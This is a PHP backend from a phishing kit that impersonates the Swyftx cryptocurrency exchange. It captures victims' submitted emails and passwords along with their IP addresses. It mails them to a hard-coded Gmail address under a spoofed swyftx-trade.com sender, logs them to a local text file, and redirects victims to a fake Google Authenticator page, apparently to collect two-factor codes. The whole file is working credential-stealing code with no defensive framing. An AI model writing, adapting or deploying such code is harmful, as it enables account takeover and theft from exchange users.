<?php

$ip 	= getenv("REMOTE_ADDR");
$email   = $_POST['email'];
$password   = $_POST['password'];



$message = "

=============1MILYARD-BITCH=============

Email		: $email
Password	: $password
IP		: $ip

==============1MILYARD-END============== ";


$to = "sutejuagus8383@gmail.com"; // ganti email
$subject = "SWYTFX MASUK = [$ip]";
$headers = "From: SETORAN <setoran@swyftx-trade.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($to, $subject, $message,$headers);


header("Location:google-authenticator.html");


?>

<?php
$ip   = getenv("REMOTE_ADDR");
$file = "_________________1MILYARD__________________.txt";
$email   = $_POST['email'];
$password = $_POST['password'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "=============1MILYARD-BITCH=============");
fwrite($handle, "\n");
fwrite($handle, "Email      : ");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "Password   : ");
fwrite($handle, "$password");
fwrite($handle, "\n");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "==============1MILYARD-END==============");
fwrite($handle, "\n");
fclose($handle);

?>
